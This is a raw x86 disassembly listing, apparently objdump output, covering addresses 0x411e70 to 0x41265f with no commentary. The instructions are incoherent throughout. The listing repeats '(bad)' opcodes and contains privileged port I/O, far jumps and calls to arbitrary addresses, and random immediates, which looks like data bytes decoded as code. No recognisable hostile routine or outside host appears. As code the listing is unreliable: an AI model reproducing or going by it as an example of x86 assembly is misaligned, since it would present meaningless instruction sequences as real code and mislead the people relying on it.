  411e70:	inc    ebp
  411e71:	je     0x411e1b
  411e73:	mov    bh,BYTE PTR [ecx+0x5fe133b7]
  411e79:	sub    bh,BYTE PTR [esi+0x4adfc2b5]
  411e7f:	cmp    bh,BYTE PTR [ebx]
  411e81:	inc    ebx
  411e82:	sub    ebx,ebx
  411e84:	lahf   
  411e85:	push   0x28
  411e87:	out    0xc0,al
  411e89:	inc    esi
  411e8a:	jae    0x411e5b
  411e8c:	xchg   esp,eax
  411e8d:	rcl    BYTE PTR [ebp-0x71de7b9f],cl
  411e93:	xchg   ebx,eax
  411e94:	jmp    0x411ea6
  411e96:	jo     0x411e77
  411e98:	fwait
  411e99:	test   BYTE PTR [ecx+ecx*1-0x3b],bh
  411e9d:	scas   eax,DWORD PTR es:[edi]
  411e9e:	jle    0x411ed8
  411ea0:	into   
  411ea1:	jb     0x411e52
  411ea3:	lods   eax,DWORD PTR ss:[esi]
  411ea5:	mov    esi,0x9d275c63
  411eaa:	call   0x2aac828e
  411eaf:	test   al,dh
  411eb1:	cs cwde 
  411eb3:	mov    DWORD PTR [eax],ebp
  411eb5:	xor    ebx,eax
  411eb7:	or     ah,BYTE PTR [ecx-0x69]
  411eba:	xchg   ecx,eax
  411ebb:	(bad)  
  411ebc:	in     eax,dx
  411ebd:	cmp    eax,0xcc908c53
  411ec2:	out    0x80,eax
  411ec4:	bound  esi,QWORD PTR [eax+0x23d4cc25]
  411eca:	or     ebx,DWORD PTR [edi+ebx*8]
  411ecd:	pusha  
  411ece:	(bad)  
  411ecf:	loop   0x411e54
  411ed1:	adc    al,0x3a
  411ed3:	scas   eax,DWORD PTR es:[edi]
  411ed4:	fsubr  st,st(7)
  411ed6:	mov    edi,0x1a52b6a1
  411edb:	in     al,dx
  411edc:	out    0x1d,eax
  411ede:	mov    bl,BYTE PTR ds:0xb9afa83f
  411ee4:	add    bl,BYTE PTR [ecx+0x3a]
  411ee7:	push   ds
  411ee8:	pop    esp
  411ee9:	mov    esi,fs
  411eeb:	adc    BYTE PTR [ebx+ebx*2],dl
  411eee:	mov    ch,0x5
  411ef0:	test   esi,edx
  411ef2:	inc    esp
  411ef3:	nop
  411ef4:	cmp    al,0x7f
  411ef6:	xor    eax,0x2bef7b60
  411efb:	scas   al,BYTE PTR es:[edi]
  411efc:	adc    eax,0x962dba02
  411f01:	rcr    DWORD PTR [edx-0xb601e33],1
  411f07:	push   esp
  411f08:	call   0x3c9dcc3f
  411f0d:	enter  0x5d60,0x39
  411f11:	out    dx,eax
  411f12:	sub    BYTE PTR [edx],cl
  411f14:	loop   0x411f6b
  411f16:	lea    ebp,ss:[esi]
  411f19:	sub    DWORD PTR [eax+ebp*4],esi
  411f1c:	out    dx,eax
  411f1d:	ds fsubr st(1),st
  411f20:	adc    DWORD PTR ds:[esi],ecx
  411f23:	adc    ch,BYTE PTR [edi]
  411f25:	xor    BYTE PTR [edi],dl
  411f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f28:	fxam   
  411f2a:	data16 das 
  411f2c:	push   0xf78b222
  411f31:	sahf   
  411f32:	arpl   WORD PTR [ecx+0x63ce2b30],sp
  411f38:	or     eax,0x898ef116
  411f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f3e:	xor    eax,0x47c3ad61
  411f43:	dec    esp
  411f44:	xchg   edi,eax
  411f45:	pusha  
  411f46:	mov    edx,0x1d76bd60
  411f4b:	dec    esi
  411f4c:	pop    ss
  411f4d:	or     DWORD PTR [edx-0x42],esp
  411f50:	test   BYTE PTR [ebp+0x2a],bh
  411f53:	das    
  411f54:	ins    DWORD PTR es:[edi],dx
  411f55:	push   ss
  411f56:	push   0x43e233ef
  411f5b:	in     eax,dx
  411f5c:	dec    ebx
  411f5d:	xchg   edx,eax
  411f5e:	mov    ecx,DWORD PTR [ebp-0x5b]
  411f61:	sar    al,0xbf
  411f64:	repz in al,dx
  411f66:	fdivr  QWORD PTR [edi]
  411f68:	jle    0x411f5e
  411f6a:	out    0x52,al
  411f6c:	add    eax,0x3821d22d
  411f71:	(bad)  
  411f72:	repz inc esp
  411f74:	mov    ebx,0xc501d3d3
  411f79:	hlt    
  411f7a:	idiv   DWORD PTR [ebx]
  411f7c:	out    dx,al
  411f7d:	aaa    
  411f7e:	js     0x411f91
  411f80:	push   0x66
  411f82:	cmp    esi,ecx
  411f84:	popf   
  411f85:	pop    edx
  411f86:	jmp    0xbd7cf38e
  411f8b:	fs mov edx,0x6f690049
  411f91:	ror    DWORD PTR [edx-0x53a19c22],0xa
  411f98:	mov    al,BYTE PTR [edi]
  411f9a:	arpl   WORD PTR [edx],bp
  411f9c:	pop    ebx
  411f9d:	mov    ch,BYTE PTR [eax]
  411f9f:	mov    ds:0x644b889d,eax
  411fa4:	(bad)  
  411fa5:	(bad)  
  411fa7:	mov    ds:0x57e59c1d,al
  411fac:	push   0x2a
  411fae:	dec    esi
  411faf:	and    DWORD PTR [ecx-0x17550f3b],ecx
  411fb5:	xchg   dh,ah
  411fb7:	inc    ecx
  411fb8:	add    DWORD PTR [eax-0x4b],edx
  411fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fbc:	xchg   DWORD PTR [edi],ebp
  411fbe:	or     eax,esi
  411fc0:	or     DWORD PTR [ebx+0x63],0x1f
  411fc4:	sar    DWORD PTR ds:0xbf31f46f,cl
  411fca:	imul   edx,DWORD PTR cs:[edi-0x162923f7],0xfaed7da1
  411fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd6:	lds    ebp,FWORD PTR [ebx+0x7]
  411fd9:	add    eax,0xc65d3978
  411fde:	inc    edx
  411fdf:	icebp  
  411fe0:	and    edi,DWORD PTR [edi-0x2b]
  411fe3:	loop   0x412003
  411fe5:	jg     0x411fb1
  411fe7:	sbb    ebp,DWORD PTR [eax+0xf]
  411fea:	cmp    DWORD PTR [esp+esi*4+0x46a4d8b1],ebp
  411ff1:	popa   
  411ff2:	in     eax,dx
  411ff3:	inc    ebx
  411ff4:	sbb    ebp,0x73ddefbd
  411ffa:	add    al,BYTE PTR [ecx]
  411ffc:	add    al,bh
  411ffe:	aad    0xb0
  412000:	inc    DWORD PTR [eax+edx*4+0x5e]
  412004:	push   edi
  412005:	mov    edi,0x708047af
  41200a:	jle    0x412075
  41200c:	loop   0x412046
  41200e:	iret   
  41200f:	or     eax,0x978d2a3e
  412014:	xor    edx,DWORD PTR [ebp+0x89aede7]
  41201a:	sub    dl,BYTE PTR [ebx-0x25]
  41201d:	ins    DWORD PTR es:[edi],dx
  41201e:	imul   esi,DWORD PTR [ecx-0x3a],0x7a9d54c3
  412025:	sar    dl,1
  412027:	call   0x6834:0x3a5bde44
  41202e:	mov    ch,ch
  412030:	jge    0x412032
  412032:	in     al,0x87
  412034:	cmp    eax,0x9e091043
  412039:	jmp    0x1662:0x7bc4a83b
  412040:	repnz mov al,gs:0xf09e034d
  412047:	inc    ecx
  412048:	test   al,0x87
  41204a:	mov    cl,0xe7
  41204c:	xor    eax,0xc67677d2
  412051:	push   edx
  412052:	clc    
  412053:	xchg   edi,eax
  412054:	fidiv  DWORD PTR [eax-0x4ec316ca]
  41205a:	jg     0x4120d0
  41205c:	mov    fs,WORD PTR [edi+0x25]
  41205f:	cs js  0x41204f
  412062:	mov    al,0xac
  412064:	fldcw  WORD PTR [esi]
  412066:	bound  esi,QWORD PTR [ebx+0x3]
  412069:	push   esi
  41206a:	mov    DWORD PTR [ebx+0x12],0x7cad7b5f
  412071:	pop    esp
  412072:	and    bh,BYTE PTR [ebx+ebx*4]
  412075:	add    eax,0x2c3ffc90
  41207a:	ret    
  41207b:	mov    cl,0xd2
  41207d:	aam    0xed
  41207f:	stc    
  412080:	fdivr  st(2),st
  412082:	lods   al,BYTE PTR ds:[esi]
  412083:	xchg   esi,eax
  412084:	mov    dh,0x49
  412086:	dec    esp
  412087:	jmp    0xa618:0x2ed07749
  41208e:	add    al,0x7a
  412090:	loope  0x4120f5
  412092:	sbb    esp,DWORD PTR [edx+ebp*8-0x34]
  412096:	mov    WORD PTR [edi],?
  412098:	dec    edx
  412099:	pop    eax
  41209a:	xor    ecx,DWORD PTR [ebp+0x6d40e023]
  4120a0:	mov    ch,0x5f
  4120a2:	xor    bh,0x54
  4120a5:	in     eax,dx
  4120a6:	xchg   ecx,eax
  4120a7:	add    BYTE PTR [ecx],al
  4120a9:	pusha  
  4120aa:	jecxz  0x412043
  4120ac:	push   0xd84961ff
  4120b1:	cli    
  4120b2:	dec    ecx
  4120b3:	ret    
  4120b4:	push   cs
  4120b5:	fadd   st,st(6)
  4120b7:	add    dl,0x72
  4120ba:	retf   0x74e8
  4120bd:	inc    edx
  4120be:	fisttp QWORD PTR [eax-0x5443a3e9]
  4120c4:	cmp    DWORD PTR [ecx-0x30],edx
  4120c7:	outs   dx,DWORD PTR ds:[esi]
  4120c8:	and    DWORD PTR [ebx+eiz*8],ebx
  4120cb:	mov    ebp,0x65e150b5
  4120d0:	mov    ebp,0xa5e4baa3
  4120d5:	adc    al,0x5f
  4120d7:	clc    
  4120d8:	dec    esi
  4120d9:	leave  
  4120da:	fcmove st,st(6)
  4120dc:	mov    cl,BYTE PTR [ebx+0x71]
  4120df:	push   ecx
  4120e0:	ins    BYTE PTR es:[edi],dx
  4120e1:	push   edi
  4120e2:	imul   ecx,esi,0x6825c37e
  4120e8:	inc    ebp
  4120e9:	xchg   BYTE PTR [edi-0x44],bl
  4120ec:	jmp    FWORD PTR [ebp+0x7d]
  4120ef:	sub    eax,0xefe0bd9b
  4120f4:	cmp    eax,0x7d4facf8
  4120f9:	jp     0x412163
  4120fb:	popf   
  4120fc:	sub    eax,0xb41ccd8f
  412101:	es ja  0x4120a2
  412104:	push   ebx
  412105:	cmp    ebp,DWORD PTR [eax]
  412107:	popf   
  412108:	inc    edi
  412109:	mov    al,0xae
  41210b:	loopne 0x4120bc
  41210d:	sub    BYTE PTR [esi+0x767ab3f9],cl
  412113:	adc    eax,0xaa4eab9a
  412118:	imul   BYTE PTR [ebp+0x3e998622]
  41211e:	push   edi
  41211f:	mov    ds:0x352b230d,eax
  412124:	in     al,dx
  412125:	xor    BYTE PTR [esi],0x3e
  412128:	dec    edx
  412129:	xchg   ecx,eax
  41212a:	mov    bl,0x64
  41212c:	or     al,0xd8
  41212e:	xor    ah,cl
  412130:	mov    edx,0x86cd63b5
  412135:	lea    ebp,[edi+0x16b3a983]
  41213b:	les    ebp,FWORD PTR [ebx-0x38115197]
  412141:	add    bh,ch
  412143:	aad    0xc5
  412145:	or     al,0x46
  412147:	nop
  412148:	add    esi,eax
  41214a:	sbb    al,0xdf
  41214c:	(bad)  
  41214d:	cli    
  41214e:	jnp    0x412170
  412150:	test   BYTE PTR [edi-0x76],bh
  412153:	rcr    ch,cl
  412155:	mov    fs,WORD PTR [ebx-0x267b0d43]
  41215b:	cmp    BYTE PTR [edi-0x5cdbde39],dl
  412161:	loope  0x412152
  412163:	mov    al,ds:0xd6698c27
  412168:	test   al,0xc8
  41216a:	xor    eax,0x7cdd18ff
  41216f:	sub    DWORD PTR [edx+0x10b34d06],0x1a
  412176:	lods   al,BYTE PTR ds:[esi]
  412177:	mov    ds:0x33083510,eax
  41217c:	arpl   WORD PTR [eax+0x301f5315],sp
  412182:	xor    al,BYTE PTR [ebx-0x2f]
  412185:	xchg   BYTE PTR [edx-0x61b28d74],bh
  41218b:	sbb    BYTE PTR [esi-0x1],0xce
  41218f:	ins    BYTE PTR es:[edi],dx
  412190:	and    cl,BYTE PTR [esi-0x1bd1a167]
  412196:	js     0x412201
  412198:	xchg   edi,eax
  412199:	fwait
  41219a:	pop    edx
  41219b:	add    al,0x95
  41219d:	or     al,0x66
  41219f:	ret    
  4121a0:	enter  0x6152,0x93
  4121a4:	push   0xc17d6550
  4121a9:	push   ds
  4121aa:	(bad)  
  4121ab:	popf   
  4121ac:	push   es
  4121ad:	xchg   edx,eax
  4121ae:	and    esp,DWORD PTR [esi+0x4f3727e2]
  4121b4:	rcl    BYTE PTR [eax-0x6d0028ad],0xab
  4121bb:	jge    0x2ad1575f
  4121c1:	or     eax,0x63580a90
  4121c6:	(bad)  
  4121c7:	stc    
  4121c8:	adc    dh,BYTE PTR [edx-0x9]
  4121cb:	mov    ah,0xfd
  4121cd:	ror    DWORD PTR [eax+0x21131dca],0xa8
  4121d4:	mov    ecx,0x9a989bbf
  4121d9:	stc    
  4121da:	ins    DWORD PTR es:[edi],dx
  4121db:	(bad)  
  4121dc:	(bad)  
  4121dd:	jecxz  0x412223
  4121df:	push   ds
  4121e0:	jge    0x412173
  4121e2:	rcl    cl,1
  4121e4:	cmp    esp,edx
  4121e6:	das    
  4121e7:	dec    ebx
  4121e8:	sub    BYTE PTR [edi-0x6c],ah
  4121eb:	pop    es
  4121ec:	ja     0x41226c
  4121ee:	sub    al,BYTE PTR [eax+0x34]
  4121f1:	inc    ebx
  4121f2:	mov    ebp,0x3521ab6
  4121f7:	mov    dl,ch
  4121f9:	out    0xf1,al
  4121fb:	popf   
  4121fc:	mov    eax,ds:0x8395eaf3
  412201:	inc    ebx
  412202:	mov    ebx,0x6c74cf7d
  412207:	dec    edi
  412208:	sbb    ebp,DWORD PTR [ebx+eax*4]
  41220b:	repz mov esi,0x14e06ed6
  412211:	push   edi
  412212:	adc    esi,DWORD PTR [edi]
  412214:	jns    0x41224f
  412216:	pop    ebp
  412217:	outs   dx,BYTE PTR ds:[esi]
  412218:	sbb    ebp,DWORD PTR [eax+0x59460809]
  41221e:	loop   0x4121be
  412220:	jp     0x4121e3
  412222:	fwait
  412223:	jae    0x4121f4
  412225:	arpl   WORD PTR [ecx-0x3c58f52d],si
  41222b:	ja     0x4121ed
  41222d:	jo     0x412231
  41222f:	mov    eax,0x6d09cd99
  412234:	call   0x869a05eb
  412239:	shr    BYTE PTR [edi+0x14bf9eb5],cl
  41223f:	ret    0x9c8d
  412242:	adc    esi,DWORD PTR [esp+eiz*2-0x3a]
  412246:	cdq    
  412247:	retf   0x7b40
  41224a:	retf   0xef29
  41224d:	mov    ds:0x3efae3e0,eax
  412252:	mov    bh,0x37
  412254:	sti    
  412255:	inc    esp
  412256:	sub    eax,0xaf24d650
  41225b:	xchg   ebx,eax
  41225c:	shl    DWORD PTR [ebp-0x7af256fa],0xd0
  412263:	or     BYTE PTR [eax+0x69],dl
  412266:	into   
  412267:	ja     0x4122be
  412269:	int    0xdb
  41226b:	sub    eax,0xd4ebe19f
  412270:	jle    0x412251
  412272:	jns    0x412293
  412274:	cmp    DWORD PTR [edx],ecx
  412276:	add    eax,0xb67377a7
  41227b:	add    bl,bl
  41227d:	cdq    
  41227e:	push   0xb9397ab1
  412283:	pop    esp
  412284:	clc    
  412285:	mov    ebp,0xb8060df7
  41228a:	inc    edi
  41228b:	xchg   ebp,eax
  41228c:	add    al,0x49
  41228e:	pop    esi
  41228f:	lahf   
  412290:	ret    
  412291:	sbb    DWORD PTR [ebp+0x70],esp
  412294:	(bad)  
  412296:	inc    ecx
  412297:	xchg   ebp,ebp
  412299:	add    dl,BYTE PTR [ebx-0x12]
  41229c:	aam    0x18
  41229e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229f:	ins    DWORD PTR es:[edi],dx
  4122a0:	pop    edi
  4122a1:	push   ds
  4122a2:	bound  eax,QWORD PTR [ecx-0x28]
  4122a5:	pushf  
  4122a6:	jmp    0x1337074b
  4122ab:	test   DWORD PTR ds:0x575641df,edx
  4122b1:	mov    ebx,esp
  4122b3:	or     BYTE PTR [edx],dl
  4122b5:	and    bl,BYTE PTR [esi+ecx*8]
  4122b8:	inc    ebx
  4122b9:	iret   
  4122ba:	ds cli 
  4122bc:	scas   eax,DWORD PTR es:[edi]
  4122bd:	sbb    cl,bl
  4122bf:	dec    esi
  4122c0:	jns    0x4122be
  4122c2:	push   cs
  4122c3:	stc    
  4122c4:	sub    cl,BYTE PTR [ebx+0x4c]
  4122c7:	pop    ds
  4122c8:	nop
  4122c9:	fwait
  4122ca:	and    BYTE PTR [edi],dh
  4122cc:	push   eax
  4122cd:	leave  
  4122ce:	xor    eax,0xc0e301af
  4122d3:	cmp    al,0x78
  4122d5:	inc    esi
  4122d6:	xchg   BYTE PTR [edi-0x43582963],dl
  4122dc:	imul   eax,DWORD PTR [edi],0x8e00855c
  4122e2:	mov    cs,WORD PTR [ecx]
  4122e4:	adc    bl,BYTE PTR [edi]
  4122e6:	aad    0xf4
  4122e8:	push   ds
  4122e9:	or     DWORD PTR [esi-0x22],0xffffff93
  4122ed:	(bad)  
  4122ee:	dec    ebp
  4122ef:	jno    0x412339
  4122f1:	or     BYTE PTR [esi+0x21],bl
  4122f4:	fldcw  WORD PTR [edi-0x11c6ebd8]
  4122fa:	xor    ah,BYTE PTR [eax]
  4122fc:	fcomi  st,st(0)
  4122fe:	cmp    eax,DWORD PTR [ecx-0x33]
  412301:	mov    al,ds:0xd4bd3d6c
  412306:	call   DWORD PTR [eax]
  412308:	dec    ebp
  412309:	shl    DWORD PTR [ebp+0x6d],1
  41230c:	mov    ebx,0xda4c3e8b
  412311:	mov    bh,0xde
  412313:	xchg   esp,eax
  412314:	pop    es
  412315:	adc    BYTE PTR [esi-0x36],bh
  412318:	pop    ebx
  412319:	mov    dl,0x7c
  41231b:	mov    ebx,0xe7e82ab0
  412320:	test   al,0xca
  412322:	ficom  DWORD PTR [edi+0x22]
  412325:	inc    ebp
  412326:	stos   BYTE PTR es:[edi],al
  412327:	pop    esp
  412328:	je     0x412352
  41232a:	or     eax,0xc75d4d21
  41232f:	daa    
  412330:	pop    eax
  412331:	xor    BYTE PTR [esi+0x27ed1186],ch
  412337:	cmp    esp,edi
  412339:	inc    edx
  41233a:	mov    ch,0xf7
  41233c:	xchg   esp,eax
  41233d:	icebp  
  41233e:	call   0x6a4e7dd
  412343:	fcom   QWORD PTR [ebx]
  412345:	mov    cl,0x81
  412347:	loop   0x41236d
  412349:	sub    DWORD PTR [esi+0x6e],edi
  41234c:	ss jne 0x41234f
  41234f:	adc    ebx,esp
  412351:	push   edx
  412352:	jp     0x41239f
  412354:	xor    edi,DWORD PTR [eax-0x35]
  412357:	pop    ebp
  412358:	stos   BYTE PTR es:[edi],al
  412359:	fsub   DWORD PTR [edi-0x2c]
  41235c:	mov    bh,0x71
  41235e:	inc    ecx
  41235f:	scas   al,BYTE PTR es:[edi]
  412360:	add    dh,BYTE PTR [esi+eiz*2]
  412363:	and    edi,edx
  412365:	leave  
  412366:	jnp    0x41232f
  412368:	shr    BYTE PTR [edi+0x4a],1
  41236b:	sub    DWORD PTR [eax+0x72],0x24
  41236f:	bound  edi,QWORD PTR [esi-0x4e]
  412372:	add    DWORD PTR [edi-0x7a],ebp
  412375:	jnp    0x4123d4
  412377:	shr    DWORD PTR [edi],1
  412379:	lods   eax,DWORD PTR ds:[esi]
  41237a:	mov    esp,0x52b3ddd0
  41237f:	cli    
  412380:	les    edi,FWORD PTR [edx]
  412382:	lock inc ebp
  412384:	push   ds
  412385:	ficomp WORD PTR [ecx]
  412387:	clc    
  412388:	popf   
  412389:	imul   esi,DWORD PTR [edi+edi*4],0xffffff8b
  41238d:	adc    BYTE PTR [ebx+0x4a],dl
  412390:	jne    0x41235d
  412392:	sbb    esp,DWORD PTR [eax+ebp*8]
  412395:	nop
  412396:	fcomp  DWORD PTR [eax-0x6315ae17]
  41239c:	and    DWORD PTR [ebx+0x79],0xc0719348
  4123a3:	das    
  4123a4:	dec    edx
  4123a5:	aaa    
  4123a6:	arpl   WORD PTR [ebp-0x1e],sp
  4123a9:	xor    eax,0xc3a71b3d
  4123ae:	pop    edi
  4123af:	and    al,0xd0
  4123b1:	dec    edx
  4123b2:	imul   edi,esi,0xffffff85
  4123b5:	adc    ebp,DWORD PTR ds:0x49e79ac7
  4123bb:	ins    BYTE PTR es:[edi],dx
  4123bc:	pop    es
  4123bd:	cs ds inc edx
  4123c0:	imul   ebx,DWORD PTR [ebx],0x88f8e810
  4123c6:	pop    ds
  4123c7:	repz jl 0x412438
  4123ca:	cwde   
  4123cb:	add    eax,0x2747a982
  4123d0:	fwait
  4123d1:	mov    ecx,0x94ee2d46
  4123d6:	jmp    0x13be62f5
  4123db:	imul   eax,DWORD PTR [esi+esi*1],0xf20008b8
  4123e2:	mov    DWORD PTR [edx],edi
  4123e4:	pop    ss
  4123e5:	mov    esi,0x211773b9
  4123ea:	shl    BYTE PTR [edi],0x4a
  4123ed:	mov    DWORD PTR ds:0x93e4fae0,ebp
  4123f3:	cmp    DWORD PTR ds:0x883e501b,0xb1b97434
  4123fd:	stos   DWORD PTR es:[edi],eax
  4123fe:	mov    eax,ds:0xe12f9c3e
  412403:	aas    
  412404:	mov    edx,0x7d21d62e
  412409:	add    dl,bh
  41240b:	pop    ebx
  41240c:	inc    ebp
  41240d:	cmp    cl,BYTE PTR [ebx+0x58]
  412410:	sub    eax,DWORD PTR [ecx-0x6fe792c5]
  412416:	sub    cl,ch
  412418:	xchg   ch,ah
  41241a:	ficom  DWORD PTR ds:0x96c7fbdb
  412420:	inc    ebx
  412421:	inc    esi
  412422:	mov    ds:0xe56a1df6,eax
  412427:	clc    
  412428:	fstp   DWORD PTR [esi-0x57]
  41242b:	daa    
  41242c:	jmp    0x4123ce
  41242e:	xchg   ebx,eax
  41242f:	jae    0x41244d
  412431:	mov    eax,ds:0xcbc7be52
  412436:	icebp  
  412437:	mov    eax,ds:0x952bea73
  41243c:	pushf  
  41243d:	or     edi,DWORD PTR [edi-0x27057ac1]
  412443:	shl    bh,cl
  412445:	jne    0x4123da
  412447:	retf   
  412448:	fs pop es
  41244a:	retf   
  41244b:	das    
  41244c:	cld    
  41244d:	push   ebx
  41244e:	jne    0x4124c1
  412450:	hlt    
  412451:	in     eax,0xe3
  412453:	std    
  412454:	mov    dh,ch
  412456:	stos   BYTE PTR es:[edi],al
  412457:	inc    esi
  412458:	nop
  412459:	cmc    
  41245a:	jmp    0x412438
  41245c:	lods   al,BYTE PTR ds:[esi]
  41245d:	adc    eax,0xc2ad900d
  412462:	ja     0x41245e
  412464:	sbb    dl,BYTE PTR [ebp-0x19]
  412467:	dec    ebx
  412468:	clc    
  412469:	enter  0xb0e,0xfb
  41246d:	inc    edi
  41246e:	leave  
  41246f:	push   cs
  412470:	shl    ebp,1
  412472:	outs   dx,DWORD PTR ds:[esi]
  412473:	jle    0x41242d
  412475:	and    DWORD PTR [ebp-0x1590f6a0],ecx
  41247b:	xor    ecx,0x3dcddadc
  412481:	ss xor esp,esi
  412484:	dec    esp
  412485:	aaa    
  412486:	push   0x6f
  412488:	jmp    esp
  41248a:	ds scas eax,DWORD PTR es:[edi]
  41248c:	out    0x73,eax
  41248e:	ins    BYTE PTR es:[edi],dx
  41248f:	push   ebx
  412490:	inc    eax
  412491:	mov    eax,ds:0xc3ddd910
  412496:	sub    bl,BYTE PTR [edi+0x72e4ca96]
  41249c:	push   ebx
  41249d:	loopne 0x412441
  41249f:	jmp    0x412466
  4124a1:	div    BYTE PTR [eax-0x1c]
  4124a4:	inc    ebx
  4124a5:	and    esi,DWORD PTR [eax]
  4124a7:	inc    esi
  4124a8:	xor    eax,0xec05b87e
  4124ad:	inc    ebp
  4124ae:	xchg   BYTE PTR [edx-0x4d],bh
  4124b1:	mov    ds:0xa5e0b70f,al
  4124b6:	enter  0xb6c,0x67
  4124ba:	and    edi,ecx
  4124bc:	cmp    DWORD PTR [ecx-0x23],edi
  4124bf:	clts   
  4124c1:	xlat   BYTE PTR cs:[ebx]
  4124c3:	stos   BYTE PTR es:[edi],al
  4124c4:	xchg   esi,eax
  4124c5:	and    ecx,edx
  4124c7:	xchg   DWORD PTR [eax],esi
  4124c9:	jb     0x4124aa
  4124cb:	inc    ebx
  4124cc:	sub    BYTE PTR [ecx+0x0],cl
  4124cf:	and    eax,0x9fb4e839
  4124d4:	in     al,dx
  4124d5:	sahf   
  4124d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124d7:	lahf   
  4124d8:	cmp    BYTE PTR [eax],ah
  4124da:	jmp    0x89dc:0x79a1af8b
  4124e1:	je     0x412492
  4124e3:	jmp    FWORD PTR [ebp+0x162eae8f]
  4124e9:	aaa    
  4124ea:	cmp    bh,dh
  4124ec:	xchg   dh,ah
  4124ee:	outs   dx,BYTE PTR ds:[esi]
  4124ef:	sub    al,0x9b
  4124f1:	jns    0x4124bb
  4124f3:	in     al,dx
  4124f4:	cmc    
  4124f5:	cmp    DWORD PTR [edi],ebx
  4124f7:	fisub  WORD PTR [esi+0x13]
  4124fa:	gs jmp 0xf0f8:0xe98e2329
  412502:	bound  edi,QWORD PTR [esi+esi*8+0x658ad3b9]
  412509:	pop    edx
  41250a:	mov    ah,0x8f
  41250c:	fstp   TBYTE PTR [edx-0x2058676c]
  412512:	mov    eax,ds:0xf572cec2
  412517:	xchg   esi,eax
  412518:	pop    ecx
  412519:	rol    BYTE PTR [edi+0x27],0x8
  41251d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41251e:	add    ecx,DWORD PTR [esi+0xc]
  412521:	sbb    BYTE PTR [edx],ch
  412523:	fimul  DWORD PTR fs:[edi+0x17]
  412527:	arpl   WORD PTR [ecx-0x58],bx
  41252a:	inc    edi
  41252b:	xchg   esi,eax
  41252c:	aaa    
  41252d:	sbb    DWORD PTR gs:[ebx-0x7],eax
  412531:	and    DWORD PTR [edi],0xffffffe5
  412534:	jae    0x41255e
  412536:	lods   al,BYTE PTR ds:[esi]
  412537:	mov    al,ds:0x832f6efa
  41253c:	xchg   esi,eax
  41253d:	pop    edi
  41253e:	push   ebp
  412540:	in     eax,dx
  412541:	add    eax,DWORD PTR [ecx]
  412543:	dec    edx
  412544:	and    DWORD PTR ss:[edx+0x40fcb24a],0xffffffde
  41254c:	js     0x412531
  41254e:	xor    edi,edi
  412550:	add    al,0x2e
  412552:	or     bh,ah
  412554:	cs ffree st(7)
  412557:	(bad)  
  412559:	ret    0x2f25
  41255c:	les    esp,FWORD PTR [esi]
  41255e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41255f:	sbb    esp,DWORD PTR [edx+ebx*2+0x38]
  412563:	loop   0x4125ae
  412565:	dec    edi
  412566:	stc    
  412567:	push   ss
  412568:	ds in  al,dx
  41256a:	adc    eax,0xa7698e91
  41256f:	mov    al,ds:0xe9e0965b
  412574:	repz (bad) 
  412576:	clc    
  412577:	ss icebp 
  412579:	es xchg edi,eax
  41257b:	sbb    al,0x46
  41257d:	test   BYTE PTR [esi+0x6618e292],0x5f
  412584:	jns    0x412581
  412586:	fsub   st(0),st
  412588:	xor    al,0x8a
  41258a:	pop    ss
  41258b:	and    DWORD PTR [edx+ebx*2-0x73],ebp
  41258f:	lea    ebp,[ecx]
  412591:	xchg   ecx,eax
  412592:	ins    DWORD PTR es:[edi],dx
  412593:	loope  0x412543
  412595:	cmc    
  412596:	shl    dh,1
  412598:	(bad)  
  412599:	sti    
  41259a:	and    al,0x76
  41259c:	in     eax,0x22
  41259e:	adc    eax,0xbc99ea14
  4125a3:	push   es
  4125a4:	maxps  xmm2,XMMWORD PTR [eax+0x37]
  4125a8:	enter  0x85e7,0xf7
  4125ac:	loope  0x412600
  4125ae:	xor    eax,0x4ba4eabb
  4125b3:	sbb    edi,eax
  4125b5:	fldenv [ecx]
  4125b7:	sar    BYTE PTR [edi-0x18aeb6],0x95
  4125be:	and    ebx,DWORD PTR [esi]
  4125c0:	test   DWORD PTR [eax-0x72],ebp
  4125c3:	rol    DWORD PTR [edx+esi*8+0x720e20e9],0x30
  4125cb:	and    ebx,DWORD PTR [eax+0x4cf89394]
  4125d1:	rol    BYTE PTR [ebx],cl
  4125d3:	aas    
  4125d4:	fdiv   DWORD PTR [eax+eiz*2-0x452f52a5]
  4125db:	push   edx
  4125dc:	(bad)  
  4125dd:	dec    edi
  4125de:	xchg   esp,edi
  4125e0:	(bad)  
  4125e2:	adc    al,0x2f
  4125e4:	out    0xad,eax
  4125e6:	mov    edx,0xc1d39005
  4125eb:	sbb    DWORD PTR [esi-0x79aaf00d],ebx
  4125f1:	mov    ecx,0x29a7940d
  4125f6:	aad    0x98
  4125f8:	mov    edi,0xe16729bc
  4125fd:	test   DWORD PTR [ebx+0x7d0c2eae],ebx
  412603:	xchg   ebp,eax
  412604:	sbb    al,0x74
  412606:	xor    BYTE PTR [eax+0x18],dh
  412609:	outs   dx,BYTE PTR ds:[esi]
  41260a:	data16 adc dl,BYTE PTR [edx+0x45e99d28]
  412611:	adc    DWORD PTR [edi-0x9],edi
  412614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412615:	(bad)  
  412616:	mov    ecx,DWORD PTR [edx-0x44]
  412619:	leave  
  41261a:	outs   dx,BYTE PTR ds:[esi]
  41261b:	inc    esp
  41261c:	inc    esp
  41261d:	clc    
  41261e:	adc    eax,0xfead74d2
  412623:	jnp    0x412693
  412625:	(bad)  
  412626:	imul   esi,ebx,0xa4648374
  41262c:	add    BYTE PTR [eax+0x79e3bcec],0xbb
  412633:	ins    BYTE PTR es:[edi],dx
  412634:	lods   eax,DWORD PTR ds:[esi]
  412635:	addr16 jmp 0x60a1:0x4d4c1da
  41263d:	add    eax,0x234ce27a
  412642:	gs loopne 0x4126c2
  412645:	push   cs
  412646:	pusha  
  412647:	mov    edi,0x62fc0154
  41264c:	push   ebx
  41264d:	icebp  
  41264e:	sub    al,0x1b
  412650:	leave  
  412651:	nop
  412652:	mov    eax,ds:0xf2231e9c
  412657:	(bad)  
  412658:	sti    
  412659:	stos   BYTE PTR es:[edi],al
  41265a:	shl    BYTE PTR [esi],0x4
  41265d:	or     al,0x91
  41265f:	jge    0x412663
